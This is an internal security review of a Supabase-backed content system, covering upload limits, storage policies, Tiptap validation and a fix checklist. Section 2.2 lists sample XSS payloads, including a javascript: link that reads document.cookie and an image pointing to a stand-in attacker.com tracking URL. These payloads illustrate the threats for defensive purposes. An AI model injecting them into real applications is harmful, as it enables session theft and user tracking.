# Phase 4: Contents System - Security Review Notes

**Date:** 2026-03-06
**Role:** Security Reviewer

---

## Executive Summary

Phase 4 introduces the highest-risk attack surface to date: file uploads, rich text rendering, and polymorphic content access. Live Supabase audit revealed three critical gaps: unconstrained storage buckets, Saelim upload access to `content-images`, and missing `created_by` on `content_attachments`.

---

## 1. File Upload Security

### 1.1 Storage Bucket Configuration Gaps (Critical)

**Finding:** Both buckets have `file_size_limit=null` and `allowed_mime_types=null`.

```
Bucket: content-images  public=true   file_size_limit=NULL  allowed_mime_types=NULL
Bucket: attachments     public=false  file_size_limit=NULL  allowed_mime_types=NULL
```

**Required bucket-level configuration:**
```sql
UPDATE storage.buckets
SET file_size_limit = 5242880,   -- 5MB
    allowed_mime_types = ARRAY['image/jpeg', 'image/png', 'image/webp', 'image/gif']
WHERE id = 'content-images';

UPDATE storage.buckets
SET file_size_limit = 20971520,  -- 20MB
    allowed_mime_types = ARRAY[
      'application/pdf',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      'application/vnd.ms-excel',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'text/csv',
      'image/jpeg',
      'image/png'
    ]
WHERE id = 'attachments';
```

### 1.2 MIME Type Validation (Server-Side)

Client-provided `Content-Type` cannot be trusted. Server-side magic byte inspection required.

```typescript
async function validateMimeType(file: File, allowedTypes: string[]): Promise<boolean> {
  const buffer = await file.slice(0, 16).arrayBuffer();
  const bytes = new Uint8Array(buffer);
  // JPEG: FF D8 FF, PNG: 89 50 4E 47, PDF: 25 50 44 46
  const detectedType = detectMimeFromMagicBytes(bytes);
  return allowedTypes.includes(detectedType) && file.type === detectedType;
}
```

`nodejs_compat` is already enabled so `Buffer` is available in CF Workers.

### 1.3 SVG Upload Attack

SVGs can contain `<script>` tags and XSS payloads. **SVG must NOT be allowed in `content-images`.** Restrict to JPEG, PNG, WebP, GIF only.

### 1.4 Filename Sanitization

Never use original filename as storage path. Generate UUID-based paths:
```typescript
function sanitizeFilename(original: string): string {
  const ext = path.extname(original).toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) throw new Error('Disallowed extension');
  return `${crypto.randomUUID()}${ext}`;
}
```

### 1.5 Orphaned File Cleanup

Recommended: Accept orphans initially, add Cloudflare Cron Trigger for weekly cleanup later (Phase 10).

---

## 2. Rich Text (Tiptap) Security

### 2.1 Tiptap's Security Model

Tiptap stores content as ProseMirror JSON (not raw HTML). Node schema acts as an allowlist. Safety guarantees apply **only when rendering through Tiptap editor**. Never use `dangerouslySetInnerHTML` with `generateHTML()` output.

### 2.2 XSS via Tiptap JSON

Attack vectors:
```json
{"type": "image", "attrs": {"src": "javascript:alert(1)"}}
{"type": "text", "marks": [{"type": "link", "attrs": {"href": "javascript:void(document.cookie)"}}]}
{"type": "image", "attrs": {"src": "https://attacker.com/track?user=X"}}
```

### 2.3 Server-Side Content Validation

```typescript
const ALLOWED_NODE_TYPES = new Set([
  'doc', 'paragraph', 'text', 'heading', 'bulletList', 'orderedList',
  'listItem', 'blockquote', 'codeBlock', 'hardBreak', 'horizontalRule', 'image'
]);

const ALLOWED_MARK_TYPES = new Set(['bold', 'italic', 'underline', 'strike', 'code', 'link']);

// Validate image.src against Supabase Storage URL pattern
const SUPABASE_STORAGE_PATTERN = /^https:\/\/[a-z]+\.supabase\.co\/storage\/v1\//;

// Validate link.href - reject javascript: protocol
function validateLinkHref(href: string): boolean {
  try {
    const url = new URL(href);
    return ['https:', 'http:', 'mailto:'].includes(url.protocol);
  } catch { return false; }
}
```

### 2.4 Content Size Limits

```typescript
const MAX_TIPTAP_JSON_SIZE = 500_000; // 500KB
const MAX_TIPTAP_DEPTH = 20;
const MAX_TIPTAP_NODES = 5_000;
```

### 2.5 Safe Rendering

```typescript
// SAFE: Tiptap EditorContent in read-only mode
<EditorContent editor={readOnlyEditor} />

// DANGEROUS - NEVER DO THIS:
const html = generateHTML(tiptapJson, extensions);
<div dangerouslySetInnerHTML={{ __html: html }} />
```

---

## 3. Storage Access Control

### 3.1 content-images Public Bucket Risks

Risks: public URLs allow unauthenticated access to images in confidential PO/PI notes.

**Recommendation:** If keeping public for simplicity:
- Restrict upload to GV users only (fix `auth_upload_images` policy)
- Enforce MIME type restrictions at bucket level
- Use UUID-based paths: `{content_type}/{parent_id}/{uuid}.jpg`

### 3.2 Storage Policy Gap (Critical)

**Current `auth_upload_images` policy allows ANY authenticated user (including Saelim).**

```sql
-- FIX: Replace with GV-only policy
DROP POLICY "auth_upload_images" ON storage.objects;
CREATE POLICY "gv_upload_images" ON storage.objects
  FOR INSERT WITH CHECK (
    bucket_id = 'content-images' AND get_user_org_type() = 'gv'
  );
```

### 3.3 Missing DELETE Policy for content-images

GV users cannot delete uploaded images. Add:
```sql
CREATE POLICY "gv_delete_images" ON storage.objects
  FOR DELETE USING (
    bucket_id = 'content-images' AND get_user_org_type() = 'gv'
  );
```

---

## 4. Content Access Control (RLS)

### 4.1 Current State (Confirmed)

```
contents:            gv_all (ALL) -- Saelim blocked
comments:            gv_all (ALL) -- Saelim blocked
content_attachments: gv_all (ALL) -- Saelim blocked
```

Correct for Phase 4. Saelim delivery content access deferred to Phase 8.

### 4.2 contents.type -- No CHECK Constraint

```sql
ALTER TABLE contents
ADD CONSTRAINT contents_type_check
CHECK (type IN ('po', 'pi', 'customs', 'shipping', 'delivery', 'order'));
```

### 4.3 parent_id Referential Integrity

No FK constraint (polymorphic). Application-level validation required:
```typescript
async function verifyParentExists(supabase, type, parentId): Promise<boolean> {
  const table = PARENT_TABLE_MAP[type];
  if (!table) return false;
  const { count } = await supabase.from(table).select('id', { count: 'exact', head: true })
    .eq('id', parentId).is('deleted_at', null);
  return (count ?? 0) > 0;
}
```

---

## 5. Comment Security

- Keep comments as **plain text** (no HTML/markdown rendering)
- React JSX escaping handles XSS
- Length limit: `max(2000)` in Zod + DB CHECK constraint
- Edit/delete: current `gv_all` policy acceptable for small trusted team

---

## 6. Cloudflare Workers Considerations

- `request.formData()` buffers entire body in memory (128MB limit)
- 20MB attachment through Worker uses 20MB memory
- **Prefer direct-to-Storage upload** or signed upload URLs to avoid Worker memory pressure
- Don't log Tiptap content body (confidential) -- `observability: { enabled: true }` sends to Logpush

---

## 7. Pre-existing Gap: shipping_documents Price Exposure

`shipping_documents` has `saelim_read` RLS policy exposing `amount` and `details` (sales prices). Saelim delivery loader (Phase 8) must explicitly exclude these columns.

---

## 8. Security Checklist

### Critical (Before/During Phase 4)
- [ ] Storage bucket `file_size_limit`: Set 5MB / 20MB
- [ ] Storage bucket `allowed_mime_types`: Configure per-bucket
- [ ] Fix `auth_upload_images` policy: GV-only
- [ ] Server-side MIME validation (magic bytes)
- [ ] Filename sanitization (UUID paths)
- [ ] Tiptap JSON server validation (node/mark allowlist, src/href validation)
- [ ] Never `dangerouslySetInnerHTML` with Tiptap output
- [ ] `contents.type` CHECK constraint
- [ ] Parent existence validation before content creation

### Warning (Should Fix)
- [ ] Add `gv_delete_images` storage policy
- [ ] Tiptap JSON size limits (500KB, depth 20, 5000 nodes)
- [ ] Comment body DB CHECK constraint (2000 chars)
- [ ] Attachment URL validation (own Supabase origin only)
- [ ] No sensitive data in console.log

### Deferred
- [ ] Orphaned file cleanup (Phase 10)
- [ ] content-images private bucket + signed URLs
- [ ] `content_attachments.created_by` column (Phase 8)
- [ ] Upload rate limiting (Phase 10)

---

## Appendix: Confirmed DB State

| Bucket | Public | file_size_limit | allowed_mime_types |
|--------|--------|-----------------|-------------------|
| content-images | TRUE | NULL | NULL |
| attachments | FALSE | NULL | NULL |
| signatures | FALSE | NULL | NULL |

| Table | Policy | Cmd |
|-------|--------|-----|
| contents | gv_all | ALL |
| comments | gv_all | ALL |
| content_attachments | gv_all | ALL |

`get_user_org_type()`: SECURITY DEFINER, reads `auth.jwt() -> 'app_metadata' ->> 'org_type'` (correct).
